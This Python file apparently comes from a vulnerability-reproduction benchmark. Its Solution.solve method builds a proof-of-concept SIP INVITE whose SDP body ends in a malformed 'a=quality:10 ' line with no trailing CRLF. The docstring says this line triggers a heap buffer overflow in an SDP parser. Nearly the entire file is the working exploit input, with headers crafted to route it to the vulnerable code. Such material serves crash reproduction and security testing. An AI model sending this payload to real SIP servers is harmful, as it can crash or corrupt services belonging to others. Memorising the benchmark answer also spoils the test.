import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in core: parser/sdp.
        The vulnerability involves missing bounds checks when parsing SDP values,
        specifically when a value ends abruptly at the end of the buffer.
        """
        
        # Construct the SDP body
        # We include standard fields to reach the parsing logic, then append
        # a malformed attribute at the end of the buffer.
        sdp_lines = [
            b"v=0",
            b"o=user 123456 654321 IN IP4 127.0.0.1",
            b"s=Session",
            b"c=IN IP4 127.0.0.1",
            b"t=0 0",
            b"m=audio 9000 RTP/AVP 0 8 101",
            b"a=rtpmap:0 PCMU/8000",
            b"a=rtpmap:8 PCMA/8000",
            b"a=rtpmap:101 telephone-event/8000",
            b"a=fmtp:101 0-15",
            b"a=sendrecv",
            # The malicious line triggering the overflow:
            # An attribute line ending with a space or incomplete value at the very end of the payload
            # without a trailing CRLF. This targets the "does not check if it is still before the end of the value" bug.
            b"a=quality:10 " 
        ]
        
        sdp_body = b"\r\n".join(sdp_lines)
        
        # Construct SIP Headers
        # A valid SIP INVITE is required to route the payload to the SDP parser.
        sip_lines = [
            b"INVITE sip:service@127.0.0.1:5060 SIP/2.0",
            b"Via: SIP/2.0/UDP 127.0.0.1:5060;branch=z9hG4bK-poc",
            b"Max-Forwards: 70",
            b"From: <sip:attacker@127.0.0.1>;tag=poc",
            b"To: <sip:victim@127.0.0.1>",
            b"Call-ID: poc-cid@127.0.0.1",
            b"CSeq: 1 INVITE",
            b"Contact: <sip:attacker@127.0.0.1>",
            b"Content-Type: application/sdp",
            # Ensure Content-Length matches exactly so the parser processes the whole body
            f"Content-Length: {len(sdp_body)}".encode(),
            b"" # Empty string to create the double CRLF delimiter
        ]
        
        # Join headers with CRLF. The empty string at the end of sip_lines combined with join
        # creates the first CRLF of the separator.
        headers = b"\r\n".join(sip_lines)
        
        # Add the second CRLF and the body
        poc = headers + b"\r\n" + sdp_body
        
        return poc